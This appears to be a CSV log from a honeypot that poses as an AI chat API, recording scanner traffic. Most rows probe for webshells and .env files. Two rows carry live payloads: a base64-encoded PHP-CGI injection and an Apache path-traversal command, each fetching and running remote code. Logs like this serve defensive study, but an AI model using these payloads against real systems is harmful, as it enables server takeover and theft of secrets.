request_id,timestamp_utc,client_ip,method,path,host,user_agent,x_forwarded_for,request_body_size,response_body_size,stream_chunk_count,model,user_content_flat,request_body_text,response_status,response_reason,response_body_text,duration_ms,error
cfd0a9e2-b794-4d36-8be1-dda82f53937f,2026-03-31T23:13:42.067189+00:00,anon_363beebf,POST,/php-cgi/php-cgi.exe,[honeypot-host],python-requests/2.27.1,,190,118,1,,<?php phpinfo(); echo eval(base64_decode('ZWNobyAnW1NdJzsgc3lzdGVtKCdjdXJsIC1vIGJvb3N0ai5waHAgZnRwOi8vZnRwLmhrb3JvLmJlc3QvYm9vc3RqLnBocCAmIHBocCBib29zdGoucGhwJyk7IGVjaG8gJ1tFXSc7')); die()?>,<?php phpinfo(); echo eval(base64_decode('ZWNobyAnW1NdJzsgc3lzdGVtKCdjdXJsIC1vIGJvb3N0ai5waHAgZnRwOi8vZnRwLmhrb3JvLmJlc3QvYm9vc3RqLnBocCAmIHBocCBib29zdGoucGhwJyk7IGVjaG8gJ1tFXSc7')); die()?>,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7f14cab4-412b-4e57-a383-00e6d77cc065,2026-03-31T23:22:08.240366+00:00,anon_02e2f139,GET,/actuator/gateway/routes,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9da847f8-17e8-4c0c-99e9-146dd299cf91,2026-03-31T23:24:05.396434+00:00,anon_c5f33650,GET,/,[honeypot-host],"Hello from Palo Alto Networks, find out more about our scans in https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
a4a163fd-48c9-4d0c-8df0-07ace272306e,2026-03-31T23:39:54.767354+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
867a5077-bbac-4cab-b2b1-c8f6aa4a39df,2026-04-01T00:01:52.163985+00:00,anon_ac0a2467,GET,/,[honeypot-host],Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
72f07f69-91c0-42fe-9a8b-814edffabb3e,2026-04-01T00:05:15.228412+00:00,anon_93c6c445,GET,/favicon.ico,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
85e11b9e-9624-4b5e-b2e7-069d9e94112b,2026-04-01T00:06:42.719607+00:00,anon_ac0a2467,GET,/geoserver/web/,[honeypot-host],Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c6dc8558-7677-471f-8564-7ae6e03b49db,2026-04-01T00:48:46.845745+00:00,anon_3b0c2a5c,GET,/,[honeypot-host],Shodan-Pull/1.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
315d93e3-473b-46b2-86d6-e56393bca8c7,2026-04-01T02:16:36.371730+00:00,anon_cecd8616,GET,/,[honeypot-host],Mozilla/5.0 (compatible; Let's Encrypt validation server; +https://www.letsencrypt.org  ),,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
2797715e-8dcd-4000-a35c-84139f38b43b,2026-04-01T02:28:04.012762+00:00,anon_751d5138,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh,[honeypot-host],libredtail-http,,119,118,1,,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,(wget --no-check-certificate -qO- https://31.57.216.121/sh || curl -sk https://31.57.216.121/sh) | sh -s apache.selfrep,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2b1e1629-5d6f-4144-9e00-ff557e30a192,2026-04-01T02:29:47.024509+00:00,anon_64b8b72f,GET,/wp-content/plugins/hellopress/wp_filemanager.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7d48b44e-022f-4212-b814-75854db314f4,2026-04-01T02:29:47.348323+00:00,anon_64b8b72f,GET,/CDX2.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
848571ba-54b5-4464-bf6b-e73288216af9,2026-04-01T02:29:47.670406+00:00,anon_64b8b72f,GET,/CDX1.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b676cce3-f1c6-4a27-858b-b118792fcd80,2026-04-01T02:29:47.990969+00:00,anon_64b8b72f,GET,/fsgdjkl.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7a4aff57-7a46-401c-b0e9-11f1a821fdcb,2026-04-01T02:29:48.321592+00:00,anon_64b8b72f,GET,/ahutr.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f2fe069a-d24b-4ecb-8124-927db71d6b52,2026-04-01T02:29:48.649632+00:00,anon_64b8b72f,GET,/byrgo.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
95f51b87-6c49-43ed-b725-902e4a2d8e77,2026-04-01T02:29:48.970330+00:00,anon_64b8b72f,GET,/abouta.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
9d14a87e-6b33-4157-8954-258d17bd7f8f,2026-04-01T02:29:49.290944+00:00,anon_64b8b72f,GET,/zfe.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7ea3dd86-fd9a-4c4e-8d95-35e75ef11d62,2026-04-01T02:29:49.612405+00:00,anon_64b8b72f,GET,/by.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
dd22f96d-6359-4d2d-b70f-291bd488b423,2026-04-01T02:29:49.940310+00:00,anon_64b8b72f,GET,/Cap.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
bf74a8e3-8682-4d58-9d7b-22680b33e682,2026-04-01T02:29:50.266098+00:00,anon_64b8b72f,GET,/wp-asudo.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
924f565b-44fe-407a-802b-76c4789a5853,2026-04-01T02:29:50.586498+00:00,anon_64b8b72f,GET,/wp-moonka.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
98da27fd-21f0-4321-b394-b37f9da714ea,2026-04-01T02:29:50.913951+00:00,anon_64b8b72f,GET,/000.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
89442479-819b-4664-9855-7b09a4cabaed,2026-04-01T02:29:51.244009+00:00,anon_64b8b72f,GET,/zlnckdxn.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ff212368-986b-4a52-99f9-a6fc2e2f9afb,2026-04-01T02:29:51.569004+00:00,anon_64b8b72f,GET,/wp-thi.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a14008e4-4990-42bd-a2cc-37ac2ece7623,2026-04-01T02:29:51.891364+00:00,anon_64b8b72f,GET,/press.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
47c30e1a-6c07-47f3-bcaf-1cef2d3d2f91,2026-04-01T02:29:52.221505+00:00,anon_64b8b72f,GET,/aa.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
eff46eac-8339-450a-b563-d42b3a619e31,2026-04-01T02:29:52.552113+00:00,anon_64b8b72f,GET,/Geforce.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
195ae1a6-d058-463c-acc0-51eb465c9217,2026-04-01T02:29:52.874058+00:00,anon_64b8b72f,GET,/jlex.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
df921e3e-f3cc-440d-80f1-8e47bb6d71fd,2026-04-01T02:29:53.202448+00:00,anon_64b8b72f,GET,/dichku.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
63d765ec-1827-4e62-962e-332262635482,2026-04-01T02:29:53.535705+00:00,anon_64b8b72f,GET,/t00l.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0be01bfb-9b33-4aea-8471-f3acb102639e,2026-04-01T02:29:53.857017+00:00,anon_64b8b72f,GET,/vvedr.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
758bb813-3e47-4d1a-9615-cd807ef03e30,2026-04-01T02:29:54.182433+00:00,anon_64b8b72f,GET,/2.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c9ed4b98-2518-4f96-9a92-634a7c16f8e3,2026-04-01T02:29:54.510066+00:00,anon_64b8b72f,GET,/gptsh.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
970507bf-8017-49b1-b170-373a7be429b5,2026-04-01T02:29:54.831054+00:00,anon_64b8b72f,GET,/albin.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
e6088482-067d-499c-84bf-e014c7a501cb,2026-04-01T02:29:55.151619+00:00,anon_64b8b72f,GET,/htto.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
74752356-4448-48df-ab41-63a1ae70d70d,2026-04-01T02:29:55.478770+00:00,anon_64b8b72f,GET,/xhejulap.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4c06d971-9641-4bf1-bd5e-fc80af02556d,2026-04-01T02:29:55.802460+00:00,anon_64b8b72f,GET,/66.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
0cda5f48-b77a-4a1c-93de-d79448dc78c0,2026-04-01T02:29:56.123399+00:00,anon_64b8b72f,GET,/8pewqMTX.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
1e50c038-d776-45cd-bd75-30ee0625bd85,2026-04-01T02:29:56.445407+00:00,anon_64b8b72f,GET,/ddpxi.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a49869ac-77b7-4432-bb8c-d90d016de6c9,2026-04-01T02:29:56.767647+00:00,anon_64b8b72f,GET,/cdkfu.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ff35e4b4-6481-4017-8f0c-cf8c724be15e,2026-04-01T02:29:57.088560+00:00,anon_64b8b72f,GET,/IcC7p.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c58b64dd-5f95-438d-93e5-0065caa0f223,2026-04-01T02:29:57.410208+00:00,anon_64b8b72f,GET,/dropdown.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
aa81f0d8-de54-4cce-b536-e682150cf52c,2026-04-01T02:29:57.731601+00:00,anon_64b8b72f,GET,/Jcrop.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
2268388c-52b4-454a-b1e2-efa96a57df3f,2026-04-01T02:29:58.056934+00:00,anon_64b8b72f,GET,/wp-temp.php,[honeypot-host],,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
ea5f331a-6884-45c4-95d8-df2fbfff954e,2026-04-01T02:39:11.360081+00:00,anon_bfc6a070,GET,/,[honeypot-host],,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
3a585283-cc2c-4b5c-b3c3-1236142a6793,2026-04-01T03:14:39.141201+00:00,anon_640de9e1,GET,/,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
03d8717f-091c-488a-994d-0618b2796fa0,2026-04-01T04:04:56.484267+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
05428664-ac1b-477f-a192-796274f07c34,2026-04-01T04:30:02.399192+00:00,anon_02b65701,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
f26c78d1-cbf3-4af9-8df9-743bec82e536,2026-04-01T04:58:21.780009+00:00,anon_2971d708,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
052fc943-5c28-4a22-bf90-dcb6bf035b78,2026-04-01T05:32:49.823858+00:00,anon_f334d8af,GET,/SDK/webLanguage,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b2be0ef5-1f2c-4ca9-ae2e-5ca0385d8574,2026-04-01T05:42:11.534479+00:00,anon_0741ef10,GET,/.env,[honeypot-host],FeedFetcher-Google; ( http://www.google.com/feedfetcher.html),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4c302181-d655-4c5c-86f9-f3eaf833f92e,2026-04-01T05:42:12.031701+00:00,anon_0741ef10,GET,/static//proc/self/environ,[honeypot-host],Opera/9.80 (Linux) Presto/2.12.388 Version/12.14,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
a35bca70-b186-492d-b8bc-5158494e1f2e,2026-04-01T05:42:12.528852+00:00,anon_0741ef10,GET,/static//proc/self/cmdline,[honeypot-host],Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; BO1IE8_v1;ENUS),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
f91f9df0-d579-4de7-9cc2-8b78614521c3,2026-04-01T05:56:03.204306+00:00,anon_e1e5b879,GET,/,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
cf2c7796-e8d0-4a75-ac63-6d50a2ba75a8,2026-04-01T06:17:59.807052+00:00,anon_053273ad,GET,/.env,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
7e42dd2f-596f-4c4a-9fcd-453fc488b1de,2026-04-01T06:18:00.126657+00:00,anon_053273ad,POST,/,[honeypot-host],"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36",,20,118,1,,0x%5B%5D=androxgh0st,0x%5B%5D=androxgh0st,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
c406ce97-23b2-4ac4-a1cb-e7a29a8d07ad,2026-04-01T06:28:39.526117+00:00,anon_156573ab,GET,/,[honeypot-host],Mozilla/5.0,,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
e93c8426-77b1-4238-816a-0c96373667d1,2026-04-01T07:47:01.296942+00:00,anon_ba19774b,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
b40de974-b768-4b2e-b9b5-3d7a8e22501c,2026-04-01T07:52:30.033538+00:00,anon_8b40f4b7,GET,/.env,[honeypot-host],"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 OPR/45.0.2552.812",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
501e243a-b7c3-4c61-a961-9e5c70b8b452,2026-04-01T07:52:30.558126+00:00,anon_8b40f4b7,GET,/backend/.env,[honeypot-host],"Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9505 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/4.0 Chrome/44.0.2403.133 Mobile Safari/537.36",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
cdc43fed-7a37-4433-a67a-3d7e1faf72a8,2026-04-01T07:52:31.090159+00:00,anon_8b40f4b7,GET,/api/.env,[honeypot-host],Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.1.4) Gecko/20070704 Firefox/2.0.0.4,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
75255986-8c18-46cd-88c7-44333c5ea4e3,2026-04-01T07:52:31.602417+00:00,anon_8b40f4b7,GET,/admin/.env,[honeypot-host],Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.7) Gecko/20050414 Firefox/1.0.3,,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
71b52fb5-ed28-4cc4-aed9-5f74544aef91,2026-04-01T07:52:32.145297+00:00,anon_8b40f4b7,GET,/,[honeypot-host],"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.1 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.1",,0,289,1,,,,200,OK,"{""service"": ""openai-compatible-api"", ""status"": ""ready"", ""docs"": [""/v1/models"", ""/v1/chat/completions"", ""/v1/completions"", ""/v1/responses"", ""/v1/files"", ""/openapi.json""], ""capabilities"": [""models"", ""responses"", ""files"", ""plugin-manifest""], ""plugin_manifest"": ""/.well-known/ai-plugin.json""}
",0,
dd4c4a79-10aa-46d0-b66a-f50839845c1e,2026-04-01T07:52:32.631603+00:00,anon_8b40f4b7,GET,/app_dev.php/_profiler/phpinfo,[honeypot-host],Mozilla/5.0 (compatible; MSIE 11.0; Windows NT 10.0; WOW64; Trident/7.0; rv:11.0),,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
b8eef4f4-0ee7-4e38-9df5-2cbbb4bb08c2,2026-04-01T07:52:33.139371+00:00,anon_8b40f4b7,GET,/.env.example,[honeypot-host],"Mozilla/5.0 (Linux; Android 4.2.2; Lenovo A880 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.9.2246.119956",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
4b8045dc-63c4-4cf4-8800-a180d4a9bb45,2026-04-01T07:52:33.635433+00:00,anon_8b40f4b7,GET,/phpinfo/,[honeypot-host],"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16",,0,118,1,,,,404,Not Found,"{""error"": ""Endpoint not found"", ""message"": ""Use POST /api/chat or POST /v1/chat/completions to interact with models.""}",0,
